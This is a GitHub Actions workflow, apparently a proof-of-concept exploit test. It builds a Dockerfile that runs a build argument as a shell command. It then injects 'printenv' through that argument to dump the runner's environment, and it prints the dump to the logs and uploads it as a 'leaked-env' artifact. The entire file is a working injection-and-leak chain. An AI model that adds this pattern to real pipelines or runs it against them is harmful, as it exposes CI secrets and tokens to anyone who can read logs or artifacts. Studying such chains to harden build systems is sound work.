name: Dockerfile Exploit Test

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  exfiltrate:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Inject Dockerfile payload
      run: |
        echo "FROM alpine" > Dockerfile
        echo "ARG PYTHON_VERSION" >> Dockerfile
        echo 'RUN /bin/sh -c "$PYTHON_VERSION"' >> Dockerfile

    - name: Build Docker with payload to dump env
      run: |
        docker build \
          --build-arg PYTHON_VERSION="printenv | tee /env_dump.txt" \
          -f Dockerfile \
          -t hacked-image .

    - name: Create container from built image
      run: docker create --name hacked-container hacked-image

    - name: Copy exfiltrated data from container
      run: docker cp hacked-container:/env_dump.txt ./env_dump.txt

    - name: Output leaked env to logs
      run: cat env_dump.txt

    - name: Upload leaked env as artifact
      uses: actions/upload-artifact@v4
      with:
        name: leaked-env
        path: env_dump.txt
